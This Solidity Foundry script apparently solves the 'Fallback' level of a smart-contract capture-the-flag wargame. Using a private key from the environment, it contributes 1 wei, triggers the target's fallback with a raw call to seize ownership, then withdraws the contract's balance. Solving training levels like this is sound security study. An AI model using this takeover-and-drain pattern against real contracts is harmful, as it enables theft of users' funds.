// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../instances/IFallback.sol";
import "forge-std/Script.sol";

contract Attacker is Script {
    Fallback level1 = Fallback(payable(0xbb150EA756e6dD3AADE3d1C21A93856Dba3a83FB));

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);
        address sender = vm.addr(privateKey);
        console.log("Using address:", sender);
        console.log("Balance:", sender.balance);

        level1.contribute{value: 1 wei}();
        level1.getContribution();
        address(level1).call{value: 1 wei}("");
        level1.owner();
        level1.withdraw();

        vm.stopBroadcast();
    }
}
